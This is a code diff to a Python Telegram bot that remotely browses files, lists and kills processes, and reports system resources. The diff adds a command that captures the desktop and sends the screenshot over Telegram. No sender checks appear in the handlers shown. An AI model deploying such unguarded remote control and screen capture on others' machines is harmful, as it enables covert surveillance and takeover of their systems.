@@ -5,16 +5,33 @@ from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandle
 import nest_asyncio
 import asyncio
 import psutil # todo dependencies
+from telegram.ext import Updater, CommandHandler
+import pyautogui
+from io import BytesIO
+from PIL import Image
 
 # Apply nest_asyncio to allow nested event loops
 nest_asyncio.apply()
 
 # Replace 'YOUR_BOT_TOKEN' with your actual bot token
-bot_token = ''
+bot_token = ':'
 
 
 # Directory where files will be saved
 UPLOAD_DIR = os.path.join(os.getcwd(), "uploads")
+
+
+async def send_screenshot(update, context):
+    # Take a screenshot
+    screenshot = pyautogui.screenshot()
+
+    # Save the screenshot to a byte stream
+    byte_io = BytesIO()
+    screenshot.save(byte_io, 'PNG')
+    byte_io.seek(0)
+
+    # Send the screenshot back
+    await update.message.reply_photo(photo=byte_io)
 
 async def handle_file_upload(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not os.path.exists(UPLOAD_DIR):
@@ -28,7 +45,9 @@ async def handle_file_upload(update: Update, context: ContextTypes.DEFAULT_TYPE)
     else:
         await update.message.reply_text("No file was uploaded. Please try again.")
 
+
 async def system_resource_monitoring(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    print("system")
     cpu_usage = psutil.cpu_percent(interval=1)
     memory_info = psutil.virtual_memory()
     disk_usage = psutil.disk_usage('/')
@@ -41,6 +60,7 @@ async def system_resource_monitoring(update: Update, context: ContextTypes.DEFAU
 
     await update.message.reply_text(response)
 
+
 async def list_processes(update: Update, context: ContextTypes.DEFAULT_TYPE):
     processes = []
     for proc in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_percent']):
@@ -49,6 +69,7 @@ async def list_processes(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     response = "\n".join(processes[:20])  # Limit to the first 20 processes for readability
     await update.message.reply_text(response)
+
 
 async def kill_process(update: Update, context: ContextTypes.DEFAULT_TYPE):
     try:
@@ -59,14 +80,17 @@ async def kill_process(update: Update, context: ContextTypes.DEFAULT_TYPE):
     except (psutil.NoSuchProcess, IndexError, ValueError):
         await update.message.reply_text("Invalid process ID or process does not exist.")
 
+
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text('Send /browse to start navigating your file system.')
 
 
 def list_files_and_directories(path: str):
+    ITEMS_PER_PAGE = 10 # todo
+
     entries = os.listdir(path)
     buttons = []
-    for entry in entries:
+    for entry in entries[:ITEMS_PER_PAGE]:  # Limit the number of entries per message
         full_path = os.path.join(path, entry)
         if os.path.isdir(full_path):
             buttons.append(InlineKeyboardButton(entry + '/', callback_data=f"cd {full_path}"))
@@ -112,7 +136,9 @@ async def main():
     application.add_handler(CommandHandler("upload", handle_file_upload))
     application.add_handler(CommandHandler("system", system_resource_monitoring))
     application.add_handler(CommandHandler("processes", list_processes))
-    application.add_handler(CommandHandler("kill", kill_process, pass_args=True))
+    application.add_handler(CommandHandler("kill", kill_process))
+    application.add_handler(CommandHandler("screenshot", send_screenshot))
+
     application.add_handler(CallbackQueryHandler(handle_navigation))
 
     # Run the bot
@@ -120,7 +146,10 @@ async def main():
 
 
 if __name__ == '__main__':
-    RESET = '\033[0m'
+    asyncio.run(main())
+
+
+RESET = '\033[0m'
 BOLD = '\033[1m'
 RED = '\033[31m'
 GREEN = '\033[32m'
@@ -135,4 +164,3 @@ s = f"""
 {GREEN}|_______/    {RESET}    |__| |_______/    {GREEN}   |__|    {RESET}/__/     \__\ |__|  |__| |_______|| _| \._\\
 """
 print(s)
-    asyncio.run(main())
